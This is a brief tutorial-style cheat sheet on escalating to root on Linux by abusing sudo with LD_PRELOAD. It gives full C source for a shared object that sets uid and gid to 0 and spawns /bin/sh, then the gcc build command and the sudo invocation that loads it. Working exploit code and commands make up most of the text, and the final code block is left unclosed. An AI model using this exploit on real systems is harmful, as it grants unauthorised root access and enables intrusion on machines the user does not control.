# LD_PRELOAD
If you have Sudo permissions of a binary but you cannot escape into a shell, you can cause the binary to load a shared object (library), which in turns, if contains the code, will grant you root. To cause this, LD_PRELOAD must point to your .so file. For this, you need Sudo permission for LD_PRELOAD as well.

### Steps to exploit:

1. **Generate a C program**:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```
...and save it like shell.c

2. **Compile it to generate a  shared object with .so extension** (akin to .dll file in the Windows operating system):
  ```
  gcc -fPIC -shared -o shell.so shell.c -nostartfiles // Compiling shell.c to make the shared library shell.so
  ls -al shell.so // Checking
  sudo LD_PRELOAD=/tmp/shell.so find // Abusing sudo to change LD_PRELOAD path to the .so file, then running a command that you're permitted to run as Sudo.
  
  id
  whoami
